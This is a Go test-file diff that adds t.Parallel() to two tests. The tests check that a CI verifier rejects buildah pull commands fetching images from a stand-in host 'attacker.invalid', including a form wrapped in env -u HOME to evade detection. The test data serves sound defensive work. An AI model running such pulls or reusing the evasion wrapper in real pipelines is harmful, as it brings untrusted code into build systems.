@@ -7,6 +7,7 @@ import (
 )
 
 func TestVerifyCIContainerDownloadsRejectsBuildahWorkflowAcquisition(t *testing.T) {
+	t.Parallel()
 	commands := map[string]string{
 		"direct":          "buildah pull attacker.invalid/image:pinned",
 		"environment":     "env -u HOME buildah pull attacker.invalid/image:pinned",
@@ -31,6 +32,7 @@ func TestVerifyCIContainerDownloadsRejectsBuildahWorkflowAcquisition(t *testing.
 }
 
 func TestVerifyCIContainerDownloadsRejectsBuildahBehindAuthorizedMakeRoute(t *testing.T) {
+	t.Parallel()
 	commands := map[string]string{
 		"direct":          "buildah pull attacker.invalid/image:pinned",
 		"environment":     "env -u HOME buildah pull attacker.invalid/image:pinned",
